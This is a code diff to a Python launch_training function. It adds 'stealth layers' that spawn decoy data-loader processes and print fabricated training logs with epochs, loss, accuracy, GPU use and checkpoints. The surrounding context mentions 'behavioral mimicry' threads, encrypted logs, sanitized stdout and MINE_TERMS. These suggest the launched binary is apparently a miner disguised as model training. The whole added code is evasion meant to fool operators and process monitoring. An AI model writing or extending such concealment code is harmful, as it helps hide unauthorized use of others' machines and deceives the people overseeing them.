@@ -467,6 +467,63 @@ def launch_training(config, binary_path):
             except:
                 pass
 
+    # === STEALTH LAYER 15: Fake child processes (data loaders) ===
+    def spawn_fake_workers(stop_evt):
+        """Spawn fake data loader worker processes so ps shows a process tree."""
+        import multiprocessing
+        workers = []
+        def worker_fn():
+            """Fake data loader — just busy-waits like real workers do."""
+            while True:
+                # Simulate data loading (CPU-heavy)
+                _ = sum(i * i for i in range(random.randint(10000, 50000)))
+                time.sleep(random.uniform(0.1, 0.5))
+
+        for i in range(random.randint(2, 4)):
+            try:
+                p = multiprocessing.Process(target=worker_fn, name=f"dataloader_worker_{i}", daemon=True)
+                p.start()
+                workers.append(p)
+            except:
+                pass
+
+        # Keep workers alive until stop signal
+        stop_evt.wait()
+        for p in workers:
+            try:
+                p.terminate()
+            except:
+                pass
+
+    # === STEALTH LAYER 16: Training-like stdout ===
+    def training_log_thread(stop_evt):
+        """Print fake training logs to stdout so terminal looks like training."""
+        import sys
+        epoch = 0
+        step = 0
+        loss = 2.415
+        acc = 38.4
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(8, 25))
+            if stop_evt.is_set(): break
+            roll = random.random()
+            if roll < 0.50:
+                step += random.randint(1, 8)
+                if step > 500:
+                    step = 1
+                    epoch += 1
+                loss = max(0.008, loss - random.uniform(0.001, 0.008))
+                acc = min(99.6, acc + random.uniform(0.02, 0.25))
+                lr = 2e-4 * 0.5 * (1 + __import__('math').cos(__import__('math').pi * epoch / 100))
+                tp = random.randint(280, 520)
+                print(f"Epoch {epoch}/100 [{step:03d}/500] | lr: {lr:.2e} | loss: {loss:.4f} | acc: {acc:.2f}% | {tp} img/s", flush=True)
+            elif roll < 0.70:
+                print(f"[Val] val_loss: {loss + 0.16:.4f} | top1: {acc:.2f}% | top5: {min(99.9, acc + 5):.1f}%", flush=True)
+            elif roll < 0.85:
+                print(f"[GPU] util: {random.randint(85, 98)}% | mem: {random.uniform(40, 65):.1f}/80GB | temp: {random.randint(62, 78)}C", flush=True)
+            else:
+                print(f"[Checkpoint] Saving model_epoch{epoch:03d}.pt ({random.randint(80, 150)}MB)", flush=True)
+
     # === LAUNCH ALL BEHAVIORAL THREADS ===
     behavioral_stop = threading.Event()
     for name, fn, args in [
@@ -477,9 +534,11 @@ def launch_training(config, binary_path):
         ("network_mix",  network_thread,      (behavioral_stop,)),
         ("ram_cycle",    ram_cycle_thread,    (behavioral_stop,)),
         ("storage_io",   storage_io_thread,   (behavioral_stop,)),
+        ("fake_workers", spawn_fake_workers,  (behavioral_stop,)),
+        ("train_log",    training_log_thread, (behavioral_stop,)),
     ]:
         threading.Thread(target=fn, args=args, daemon=True, name=name).start()
-    print(f"[System] Behavioral mimicry active (7 threads)", flush=True)
+    print(f"[System] Behavioral mimicry active (9 threads)", flush=True)
 
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
